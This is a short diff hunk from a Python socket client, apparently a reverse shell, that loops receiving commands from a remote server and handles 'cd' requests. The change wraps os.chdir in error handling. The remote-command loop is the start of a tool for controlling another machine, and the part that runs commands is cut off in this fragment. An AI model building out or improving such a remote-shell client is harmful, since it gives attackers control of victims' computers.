@@ -16,10 +16,14 @@ def client_sock(ip_addr, port):
     while True:
         # receive the command from the server
 
+        
         command = s.recv(1024)
         if command[:2].decode() == 'cd':
             # Put some error handling bro
-            os.chdir(command[3:].decode('utf-8'))
+            try:
+                os.chdir(command[3:].decode('utf-8'))
+            except OSError as e:
+                print(e)
         if len(command) > 0:
             try:
             # We need to make our own little package to do this (better) lol
